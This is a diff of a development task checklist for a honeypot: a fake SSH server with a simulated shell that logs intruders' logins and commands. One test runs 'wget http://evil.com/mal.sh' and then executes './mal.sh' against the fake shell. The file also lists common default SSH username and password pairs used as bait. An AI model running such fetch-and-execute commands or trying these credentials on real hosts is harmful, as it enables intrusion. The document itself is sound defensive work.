@@ -30,8 +30,8 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - Verify `Session` `ended_at` defaults to `None`
     - _Requirements: 9.2_
 
-- [~] 3. Config loader (`trap/config.py`)
-  - [ ] 3.1 Implement `Config` dataclass and `load_config()` function
+- [x] 3. Config loader (`trap/config.py`)
+  - [x] 3.1 Implement `Config` dataclass and `load_config()` function
     - Implement frozen `Config` dataclass matching the design spec (all 10 fields with correct types and defaults)
     - Implement `load_config()`: reads env vars, applies defaults, validates each rule from the design (port range, non-empty paths, positive integers, optional `TRAP_ACCEPT_AFTER_ATTEMPTS`)
     - On any validation failure: log a descriptive message to stderr and call `sys.exit(1)`
@@ -44,14 +44,14 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - Use `pytest.raises(SystemExit)` for failure cases
     - _Requirements: 1.6_
 
-  - [ ] 3.3 Write property test for config validation (Property 7)
+  - [x] 3.3 Write property test for config validation (Property 7)
     - **Property 7: Config validation rejects invalid values**
     - **Validates: Requirements 1.6**
     - Strategy: `st.one_of(st.text(), st.integers(max_value=0), st.integers(min_value=65536))` for port; verify `sys.exit(1)` is called
     - _Requirements: 1.6_
 
-- [ ] 4. Fake Filesystem (`trap/ghost/filesystem.py` + `trap/ghost/fs_template.yaml`)
-  - [ ] 4.1 Implement `FakeNode` dataclass and `FakeFilesystem` class
+- [x] 4. Fake Filesystem (`trap/ghost/filesystem.py` + `trap/ghost/fs_template.yaml`)
+  - [x] 4.1 Implement `FakeNode` dataclass and `FakeFilesystem` class
     - Implement `FakeNode` dataclass exactly as designed (`name`, `is_dir`, `content`, `permissions`, `owner`, `size`, `mtime`, `children`)
     - Implement `FakeFilesystem.__init__` that deep-copies the template root and initialises `_cwd = []`
     - Implement `cwd_path()` returning the absolute path string (e.g. `/root`)
@@ -67,13 +67,13 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - Use `yaml.safe_load` (never `yaml.load`) for template loading; raise on unsafe loader
     - _Requirements: 4.4, 4.5, 5.1, 5.2, 5.3, 5.10, 5.11, 5.12, 5.14, 10.2_
 
-  - [ ] 4.2 Write the filesystem template (`trap/ghost/fs_template.yaml`)
+  - [x] 4.2 Write the filesystem template (`trap/ghost/fs_template.yaml`)
     - Define the full "records-srv-09" tree as shown in the design data model section
     - Must include: `/etc/hostname` (content: `records-srv-09\n`), `/root/` (empty dir), `/home/caretaker/last_words.txt` (lore content as shown), `/vault/` (empty dir), `/var/log/`, `/tmp/`
     - All nodes must have `type`, `permissions`, `owner`, `mtime`, `content` (for files) or `children` (for dirs) fields
     - _Requirements: 4.4, 4.2_
 
-  - [ ] 4.3 Write unit tests for filesystem (`tests/test_unit_filesystem.py`)
+  - [x] 4.3 Write unit tests for filesystem (`tests/test_unit_filesystem.py`)
     - Test path resolution: absolute paths, relative paths, `..` traversal, `..` from root (stays at root), `.`
     - Test `cd` to existing dir, `cd` to non-existent path (error, cwd unchanged), `cd ..` from root
     - Test `mkdir` success, `mkdir` on existing path (error)
@@ -84,7 +84,7 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - Test `create_file` with content
     - _Requirements: 5.1, 5.2, 5.3, 5.4, 5.10, 5.11, 5.12, 5.14_
 
-  - [ ] 4.4 Write property tests for filesystem (Properties 3, 8, 9, 10)
+  - [x] 4.4 Write property tests for filesystem (Properties 3, 8, 9, 10)
     - **Property 3: Filesystem isolation — sessions are independent**
     - **Property 8: mkdir → ls round-trip**
     - **Property 9: rm → cat round-trip**
@@ -92,8 +92,8 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - **Validates: Requirements 4.5, 5.1, 5.2, 5.4, 5.10, 5.11, 5.12, 5.14**
     - _Requirements: 11.2, 11.3_
 
-- [ ] 5. Event logger (`trap/ghost/logger.py`)
-  - [ ] 5.1 Implement `EventLogger` async context manager
+- [x] 5. Event logger (`trap/ghost/logger.py`)
+  - [x] 5.1 Implement `EventLogger` async context manager
     - Open the session log file in append mode using `aiofiles.open` inside `__aenter__`
     - Implement `write(event)`: serialise via `dataclasses.asdict`, append JSON + newline, call `await f.flush()`
     - Implement `__aexit__`: flush and close the file handle
@@ -101,7 +101,7 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - Ensure the `LOG_DIR` path is created if it does not exist (using `aiofiles.os.makedirs` or `pathlib.Path.mkdir`)
     - _Requirements: 9.1, 9.2, 9.3, 9.4, 9.5_
 
-  - [ ] 5.2 Write unit tests for event logger (`tests/test_unit_logger.py`)
+  - [x] 5.2 Write unit tests for event logger (`tests/test_unit_logger.py`)
     - Test that `write()` appends a valid JSON line to the file
     - Test that `write()` calls flush after each write
     - Test that `write()` re-raises `OSError`
@@ -109,26 +109,26 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - Use `tmp_path` pytest fixture for the log directory
     - _Requirements: 9.1, 9.2, 9.4, 9.5_
 
-  - [ ] 5.3 Write property test for session log JSON Lines round-trip (Property 18)
+  - [x] 5.3 Write property test for session log JSON Lines round-trip (Property 18)
     - **Property 18: Session_Log validity — JSON Lines round-trip**
     - **Validates: Requirements 9.2, 11.5, 11.6**
     - Strategy: `st.lists(st.text(max_size=256), min_size=1, max_size=20)` for command strings; write events, read file, parse each line as JSON, verify all required fields present
     - _Requirements: 11.5, 11.6_
 
-- [ ] 6. LLM interface (`trap/ghost/llm.py`)
-  - [ ] 6.1 Implement `LLMInterface` ABC and `ScriptedFallback`
+- [x] 6. LLM interface (`trap/ghost/llm.py`)
+  - [x] 6.1 Implement `LLMInterface` ABC and `ScriptedFallback`
     - Define abstract base class `LLMInterface` with `async def respond(self, session_context: SessionContext, command: str) -> str`
     - Implement `ScriptedFallback.respond()`: split command on whitespace, return `f"bash: {cmd}: command not found"` where `cmd` is the first token (or the whole string if no whitespace)
     - _Requirements: 7.1, 7.2, 7.3, 7.4_
 
-  - [ ] 6.2 Write unit tests for LLM interface (`tests/test_unit_llm.py`)
+  - [x] 6.2 Write unit tests for LLM interface (`tests/test_unit_llm.py`)
     - Test `ScriptedFallback` with multi-word command returns correct first-token format
     - Test `ScriptedFallback` with empty-ish command (single token)
     - Test dispatcher calls `llm.respond()` when command not in registry
     - Test dispatcher returns fallback and logs when `llm.respond()` raises any exception
     - _Requirements: 7.3, 7.5_
 
-  - [ ] 6.3 Write property tests for ScriptedFallback and LLM exception handling (Properties 13, 14)
+  - [x] 6.3 Write property tests for ScriptedFallback and LLM exception handling (Properties 13, 14)
     - **Property 13: ScriptedFallback command-not-found format**
     - **Property 14: LLM exception fallback — session stays open**
     - **Validates: Requirements 7.3, 7.5**
@@ -136,15 +136,15 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - Strategy for P14: `st.text(min_size=1)` + mock LLM that raises; verify fallback returned and session not closed
     - _Requirements: 7.3, 7.5_
 
-- [ ] 7. Command handlers — navigation and info (`trap/ghost/commands/navigation.py`, `trap/ghost/commands/info.py`)
-  - [ ] 7.1 Implement navigation commands (`pwd`, `cd`, `ls`)
+- [x] 7. Command handlers — navigation and info (`trap/ghost/commands/navigation.py`, `trap/ghost/commands/info.py`)
+  - [x] 7.1 Implement navigation commands (`pwd`, `cd`, `ls`)
     - `pwd`: calls `ctx.fs.cwd_path()`, returns it as output string
     - `cd <path>`: calls `ctx.fs.cd(path)`; on error returns `bash: cd: <path>: No such file or directory`; `cd` with no args changes to the authenticated user's home directory
     - `ls [path] [-la]`: calls `ctx.fs.ls(path)`; plain `ls` returns space-separated names; `ls -la` returns formatted table with permissions, owner, size, mtime columns
     - All handlers return `CommandResult(output=..., is_error=False/True)`
     - _Requirements: 5.1, 5.2, 5.3_
 
-  - [ ] 7.2 Implement info commands (`whoami`, `id`, `uname`, `hostname`, `echo`)
+  - [x] 7.2 Implement info commands (`whoami`, `id`, `uname`, `hostname`, `echo`)
     - `whoami`: returns `ctx.session.username`
     - `id`: returns `uid=0(root) gid=0(root) groups=0(root)` for root; non-root equivalent otherwise
     - `uname -a`: returns the 2009-era kernel version string from the design (`Linux records-srv-09 2.6.18-92.el5 #1 SMP ...`)
@@ -152,7 +152,7 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - `echo <args>`: joins args with single space; no variable expansion (`$PATH` returned literally)
     - _Requirements: 5.5, 5.6, 5.7, 5.8, 5.9_
 
-  - [ ] 7.3 Write unit tests for navigation and info commands (`tests/test_unit_commands.py` — navigation/info section)
+  - [x] 7.3 Write unit tests for navigation and info commands (`tests/test_unit_commands.py` — navigation/info section)
     - Test each command with representative inputs
     - Test `cd` to non-existent path returns error without changing cwd
     - Test `ls -la` output includes all required columns
@@ -160,7 +160,7 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - Test `id` for root vs non-root username
     - _Requirements: 5.1, 5.2, 5.3, 5.5, 5.6, 5.7, 5.8, 5.9_
 
-  - [ ] 7.4 Write property tests for echo identity and prompt format (Properties 11, 12)
+  - [x] 7.4 Write property tests for echo identity and prompt format (Properties 11, 12)
     - **Property 11: Prompt format correctness**
     - **Property 12: echo is identity on its arguments**
     - **Validates: Requirements 4.3, 5.9**
@@ -168,8 +168,8 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - Strategy for P12: `st.lists(st.text(max_size=128), max_size=20)`
     - _Requirements: 4.3, 5.9_
 
-- [ ] 8. Command handlers — files, history, download, exit (`trap/ghost/commands/files.py`, `trap/ghost/commands/history.py`, `trap/ghost/commands/download.py`, `trap/ghost/commands/exit_.py`)
-  - [ ] 8.1 Implement file commands (`cat`, `touch`, `rm`, `mkdir`, `chmod`)
+- [x] 8. Command handlers — files, history, download, exit (`trap/ghost/commands/files.py`, `trap/ghost/commands/history.py`, `trap/ghost/commands/download.py`, `trap/ghost/commands/exit_.py`)
+  - [x] 8.1 Implement file commands (`cat`, `touch`, `rm`, `mkdir`, `chmod`)
     - `cat <file>`: calls `ctx.fs.cat(path)`; on error returns `cat: <file>: No such file or directory`
     - `touch <file>`: calls `ctx.fs.touch(path)`, returns empty string
     - `rm [-rf] <path>`: calls `ctx.fs.rm(path, recursive="-rf" in args)`; on error returns `rm: cannot remove '<path>': No such file or directory`
@@ -177,23 +177,23 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - `chmod <mode> <path>`: calls `ctx.fs.chmod(path, mode)`; on error returns `chmod: cannot access '<path>': No such file or directory`
     - _Requirements: 5.4, 5.10, 5.11, 5.12, 5.14_
 
-  - [ ] 8.2 Implement history command (`trap/ghost/commands/history.py`)
+  - [x] 8.2 Implement history command (`trap/ghost/commands/history.py`)
     - `history`: formats `ctx.history` as a numbered list (1-indexed), one entry per line, e.g. `    1  pwd`
     - _Requirements: 5.13_
 
-  - [ ] 8.3 Implement download simulation (`trap/ghost/commands/download.py`)
+  - [x] 8.3 Implement download simulation (`trap/ghost/commands/download.py`)
     - `wget <url>`: log `download_attempt` event via `ctx`; print plausible progress output (percentage, speed, file size); create a fake empty file in `ctx.fs` cwd named after the last URL path segment; after calling `ctx.fs.create_file(filename)`, also add the basename to `ctx.downloaded_files`; make NO outbound network request
     - `curl <url>`: same as wget but with curl-style transfer statistics output; after creating the fake file, also add the basename to `ctx.downloaded_files`
     - If the entity later runs `./<downloaded_filename>`, return `Segmentation fault (core dumped)`
     - Parse the first URL argument from args; record the full command string and parsed URL in the event payload
     - _Requirements: 6.1, 6.2, 6.3, 6.4, 6.5, 6.6_
 
-  - [ ] 8.4 Implement exit command (`trap/ghost/commands/exit_.py`)
+  - [x] 8.4 Implement exit command (`trap/ghost/commands/exit_.py`)
     - Define sentinel exception `SessionExitRequested`
     - `exit` handler raises `SessionExitRequested`; `shell.py` catches this to cleanly close the session
     - _Requirements: 5.15_
 
-  - [ ] 8.5 Write unit tests for file, history, download, exit commands (`tests/test_unit_commands.py` — files/download/exit section)
+  - [x] 8.5 Write unit tests for file, history, download, exit commands (`tests/test_unit_commands.py` — files/download/exit section)
     - Test `cat` success and missing file
     - Test `touch` creates file, `touch` existing file no-op
     - Test `rm` file and `rm -rf` directory; `rm` non-existent error
@@ -204,14 +204,14 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - Test exit raises `SessionExitRequested`
     - _Requirements: 5.4, 5.10, 5.11, 5.12, 5.13, 5.14, 5.15, 6.1, 6.2, 6.3, 6.4_
 
-  - [ ] 8.6 Write property tests for download simulation (Property 19)
+  - [x] 8.6 Write property tests for download simulation (Property 19)
     - **Property 19: Download simulation — no real network, fake file created**
     - **Validates: Requirements 6.1, 6.2, 6.3, 6.4, 6.6**
     - Strategy: `st.from_regex(r'https?://[a-z0-9./\-]+\.[a-z]{2,}/[a-z0-9.\-]+')`; verify download_attempt event recorded, output non-empty, no network call made, fake file exists in cwd
     - _Requirements: 6.1, 6.2, 6.3, 6.4, 6.6_
 
-- [ ] 9. Command dispatcher (`trap/ghost/dispatcher.py`)
-  - [ ] 9.1 Implement `CommandResult` dataclass and `Dispatcher` class
+- [x] 9. Command dispatcher (`trap/ghost/dispatcher.py`)
+  - [x] 9.1 Implement `CommandResult` dataclass and `Dispatcher` class
     - Implement `CommandResult` dataclass with `output: str` and `is_error: bool`
     - Implement `Dispatcher.register(name, handler)` to populate the handler registry
     - Implement `Dispatcher._tokenise_chain(raw)`: state-machine parser respecting single- and double-quoted strings; splits on `&&`, `;`, `|`; returns `list[tuple[str, list[str]]]` of `(operator, tokens)`
@@ -226,7 +226,7 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - Register all command handlers from `trap/ghost/commands/` at startup
     - _Requirements: 8.1, 8.2, 8.3, 8.4, 8.5, 7.1, 6.5_
 
-  - [ ] 9.2 Write unit tests for dispatcher (`tests/test_unit_dispatcher.py`)
+  - [x] 9.2 Write unit tests for dispatcher (`tests/test_unit_dispatcher.py`)
     - Test semicolon chain: all commands execute and outputs concatenate
     - Test `&&` chain: right executes on left success; right skipped on left error
     - Test pipe: left output passed as argument to right
@@ -235,7 +235,7 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - Test quoted strings are tokenised correctly (space inside quotes is not a separator)
     - _Requirements: 8.1, 8.2, 8.3, 8.4_
 
-  - [ ] 9.3 Write property tests for dispatcher chains and robustness (Properties 1, 2, 15, 16, 17)
+  - [x] 9.3 Write property tests for dispatcher chains and robustness (Properties 1, 2, 15, 16, 17)
     - **Property 1: Ghost Shell robustness — arbitrary input never raises**
     - **Property 2: No-execution invariant — forbidden APIs never invoked**
     - **Property 15: Semicolon chain — all tokens execute**
@@ -249,21 +249,21 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - Strategy for P17: lists of commands including one that raises
     - _Requirements: 10.1, 10.4, 11.1, 11.4, 8.1, 8.2, 8.4_
 
-  - [ ] 9.4 Write unit test for path-execution dispatch (downloaded vs unknown)
+  - [x] 9.4 Write unit test for path-execution dispatch (downloaded vs unknown)
     - Test: after `wget http://evil.com/mal.sh`, dispatching `./mal.sh` returns `Segmentation fault (core dumped)`
     - Test: dispatching `./unknown.sh` (not downloaded) returns `bash: ./unknown.sh: No such file or directory`
     - Test: dispatching `/tmp/x` (not downloaded) returns `bash: /tmp/x: No such file or directory`
     - Test: dispatching `/root/mal.sh` after downloading `mal.sh` returns `Segmentation fault (core dumped)`
     - _Requirements: 6.5_
 
-  - [ ] 9.5 Write property test for downloaded file execution (Property 23)
+  - [x] 9.5 Write property test for downloaded file execution (Property 23)
     - **Property 23: Executing a downloaded file returns segfault; executing an unknown path returns command-not-found**
     - **Validates: Requirements 6.5**
     - Strategy: `st.from_regex(r'[a-z][a-z0-9_\-]{0,31}\.[a-z]{1,4}')` for filenames; simulate a download to populate `ctx.downloaded_files`; assert `./filename` returns `Segmentation fault (core dumped)`; assert `./other_name` returns `bash: ./other_name: No such file or directory`
     - _Requirements: 6.5_
 
-- [ ] 10. Attempt tracker (`trap/auth/tracker.py`)
-  - [ ] 10.1 Implement `AttemptTracker`
+- [x] 10. Attempt tracker (`trap/auth/tracker.py`)
+  - [x] 10.1 Implement `AttemptTracker`
     - Implement `AttemptTracker.__init__(max_attempts_per_ip)` initialising the `OrderedDict[str, deque[datetime]]`; set `_max_per_ip = max_attempts_per_ip` (default 101)
     - Implement `_prune_ip(src_ip)`: remove timestamps older than 1 hour from left of deque; remove key if deque becomes empty
     - Implement `_move_to_end(src_ip)`: call `self._window.move_to_end(src_ip)`
@@ -271,7 +271,7 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - Implement `should_accept(src_ip, n)`: prune first; return `len(self._window.get(src_ip, deque())) >= n`
     - _Requirements: 2.7_
 
-  - [ ] 10.2 Write unit tests for attempt tracker (`tests/test_unit_tracker.py`)
+  - [x] 10.2 Write unit tests for attempt tracker (`tests/test_unit_tracker.py`)
     - Test `should_accept` returns False before N attempts, True at N attempts
     - Test timestamps older than 1 hour are pruned
     - Test per-IP timestamp cap: deque never exceeds `_max_per_ip`
@@ -279,7 +279,7 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - Test `record_attempt` and `should_accept` called concurrently from the same event loop (asyncio)
     - _Requirements: 2.7_
 
-  - [ ] 10.3 Write property tests for attempt tracker (Properties 20, 22)
+  - [x] 10.3 Write property tests for attempt tracker (Properties 20, 22)
     - **Property 20: Attempt-counter threshold acceptance**
     - **Property 22: AttemptTracker memory is bounded**
     - **Validates: Requirements 2.7**
@@ -287,19 +287,19 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - Strategy for P22: `st.lists(st.ip_addresses(), min_size=1, max_size=50_000)` with `max_attempts_per_ip=5`; assert IP count ≤ 10,000 and per-IP deque length ≤ 5
     - _Requirements: 2.7_
 
-- [ ] 11. Default credential file (`trap/credentials_default.txt`)
+- [x] 11. Default credential file (`trap/credentials_default.txt`)
   - Write approximately 30 `username:password` pairs, one per line
   - Include all combinations required by Req 2.6: usernames `root`, `admin`, `ubuntu`, `pi`, `user`; passwords `123456`, `password`, `admin`, `root`, `12345678`, `qwerty`; plus pairs `root:root`, `admin:admin`, `pi:raspberry`, `ubuntu:ubuntu`, `user:user`
   - _Requirements: 2.6_
 
-  - [ ] 11.1 Write property test for credential list parse round-trip (Property 6)
+  - [x] 11.1 Write property test for credential list parse round-trip (Property 6)
     - **Property 6: Credential list parse round-trip**
     - **Validates: Requirements 1.4**
     - Strategy: `st.lists(st.tuples(st.text(min_size=1, max_size=32), st.text(min_size=1, max_size=64)))`; serialise to credential file format, parse back, assert all pairs recovered exactly
     - _Requirements: 1.4_
 
-- [ ] 12. SSH server (`trap/server.py`)
-  - [ ] 12.1 Implement `TrapServer` and `start_server()`
+- [x] 12. SSH server (`trap/server.py`)
+  - [x] 12.1 Implement `TrapServer` and `start_server()`
     - Implement `start_server(config)`: call `asyncssh.create_server` on `config.trap_port`, passing the loaded/generated Ed25519 host key
     - Implement host key lifecycle: if file at `config.host_key_path` exists, call `asyncssh.read_private_key`; otherwise call `asyncssh.generate_private_key("ssh-ed25519")` and write to path
     - Implement `TrapServer(asyncssh.SSHServer)` overriding `connection_made(conn)`:
@@ -319,7 +319,7 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - On accepted auth: set `self._shell_took_over = True` before handing the already-open `self._logger` to `run_shell()`
     - _Requirements: 1.1, 1.2, 1.3, 1.4, 2.1, 2.2, 2.3, 2.4, 2.5, 2.7_
 
-  - [ ] 12.2 Write property tests for credential auth round-trip (Properties 4, 5)
+  - [x] 12.2 Write property tests for credential auth round-trip (Properties 4, 5)
     - **Property 4: Credential authentication round-trip**
     - **Property 5: Login attempt event completeness**
     - **Validates: Requirements 2.1, 2.2, 2.3**
@@ -327,8 +327,8 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - Strategy for P5: `st.tuples(st.ip_addresses(), st.integers(1024, 65535), st.text(min_size=1), st.text())`; verify all 8 required fields in the logged event
     - _Requirements: 2.1, 2.2, 2.3_
 
-- [ ] 13. Ghost Shell session (`trap/ghost/shell.py`)
-  - [ ] 13.1 Implement `run_shell()` coroutine and MOTD
+- [x] 13. Ghost Shell session (`trap/ghost/shell.py`)
+  - [x] 13.1 Implement `run_shell()` coroutine and MOTD
     - Compose the MOTD string: include `records-srv-09`, the decommissioned municipal records purpose, and the lore hint about the missing caretaker (e.g. "Caretaker H. last login: Oct 31 2013")
     - `run_shell` receives the already-open `EventLogger` from `TrapServer`; it does NOT open or close the logger itself — it only writes events and the final `session_end`
     - Send MOTD to `process.stdout`
@@ -343,13 +343,13 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - Outermost broad `try/except Exception`: write `session_end(reason="disconnect")`, log exception, do not crash server
     - _Requirements: 3.1, 3.2, 3.3, 3.4, 3.5, 3.6, 4.1, 4.2, 4.3, 9.3, 9.4_
 
-  - [ ] 13.2 Write property tests for oversized input handling (Property 21)
+  - [x] 13.2 Write property tests for oversized input handling (Property 21)
     - **Property 21: Oversized input — discarded, session stays open**
     - **Validates: Requirements 3.5**
     - Strategy: `st.text(min_size=4097, max_size=8192)`; assert `bash: line too long` returned and session coroutine does not exit
     - _Requirements: 3.5_
 
-- [ ] 14. Entry point (`trap/__main__.py`)
+- [x] 14. Entry point (`trap/__main__.py`)
   - Implement the module entry point that wires all components together and starts the asyncio event loop
   - Call `load_config()` to get the `Config` object; exit on failure (config handles this)
   - Load the credential file specified by `config.credential_file`; parse into a `set[tuple[str, str]]`
@@ -360,13 +360,13 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
   - Configure Python `logging` (level INFO, structured format including timestamp and session ID where available)
   - _Requirements: 1.1, 1.2, 1.3, 1.4, 7.4_
 
-- [ ] 15. Checkpoint — unit test suite passes
+- [x] 15. Checkpoint — unit test suite passes
   - Ensure all unit tests pass: `pytest tests/test_unit_*.py -v`
   - Ensure no import errors across the entire `trap/` package
   - Ask the user if questions arise before proceeding to property tests and integration.
 
-- [ ] 16. Property-based test suite (`tests/test_properties.py`)
-  - [ ] 16.1 Collect and wire all 22 property test functions into `tests/test_properties.py`
+- [x] 16. Property-based test suite (`tests/test_properties.py`)
+  - [x] 16.1 Collect and wire all 22 property test functions into `tests/test_properties.py`
     - Each test function must have a comment header: `# Feature: trap-core, Property N: <title>`
     - Each test must be decorated with `@given(...)` using the Hypothesis strategy from the design
     - Each test must run a minimum of 100 trials (use `@settings(max_examples=100)`)
@@ -374,8 +374,8 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - Verify each property matches its design description exactly
     - _Requirements: 11.1, 11.2, 11.3, 11.4, 11.5, 11.6, 10.1, 10.4_
 
-- [ ] 17. Integration smoke test (`tests/test_integration.py`)
-  - [ ] 17.1 Implement the integration smoke test
+- [x] 17. Integration smoke test (`tests/test_integration.py`)
+  - [x] 17.1 Implement the integration smoke test
     - Spin up a real `asyncssh` server on a random available port using `start_server()` with a test config (in-memory key, temp log dir)
     - Connect a test SSH client using `asyncssh.connect`
     - Verify: MOTD is received and contains `records-srv-09`
@@ -385,23 +385,23 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - Verify: the server closes cleanly after the client disconnects
     - _Requirements: 1.1, 2.1, 4.1, 4.3, 9.1, 9.2, 5.1, 5.5_
 
-- [ ] 18. Static analysis gate
-  - [ ] 18.1 Run and fix ruff
+- [x] 18. Static analysis gate
+  - [x] 18.1 Run and fix ruff
     - Run `ruff check trap/ tests/` and fix all reported issues
     - Ensure the `ruff` config in `pyproject.toml` targets Python 3.12
     - _Requirements: 10.5_
 
-  - [ ] 18.2 Run and fix bandit
+  - [x] 18.2 Run and fix bandit
     - Run `bandit -r trap/ -ll` and fix or annotate any high-severity findings
     - Confirm `B603`, `B602`, `B605` (subprocess), `B506` (`yaml.load`) report zero findings
     - _Requirements: 10.1, 10.5_
 
-  - [ ] 18.3 Run and fix mypy
+  - [x] 18.3 Run and fix mypy
     - Run `mypy --strict trap/` and fix all type errors
     - All dataclasses must have complete type annotations; no `Any` unless explicitly justified
     - _Requirements: 10.5_
 
-  - [ ] 18.4 Write AST-based forbidden-import unit test (`tests/test_no_exec.py`)
+  - [x] 18.4 Write AST-based forbidden-import unit test (`tests/test_no_exec.py`)
     - Write a pytest test that uses Python's `ast` module (not subprocess) to parse every `.py` file found under `trap/` recursively
     - Walk the AST of each file and fail if any of the following are found:
       - An `ast.Import` or `ast.ImportFrom` whose module name starts with `subprocess` or equals `pty`
@@ -411,7 +411,7 @@ Implement the fake SSH server ("The Trap") and interactive shell simulator ("The
     - This test does NOT run any processes — it is pure AST analysis
     - _Requirements: 10.1_
 
-- [ ] 19. Final checkpoint — all tests and static analysis pass
+- [x] 19. Final checkpoint — all tests and static analysis pass
   - Run `pytest tests/ -v` (all unit, property, and integration tests)
   - Run `ruff check trap/ tests/`, `bandit -r trap/ -ll`, `mypy --strict trap/`
   - All checks must pass with zero findings before this task is complete.
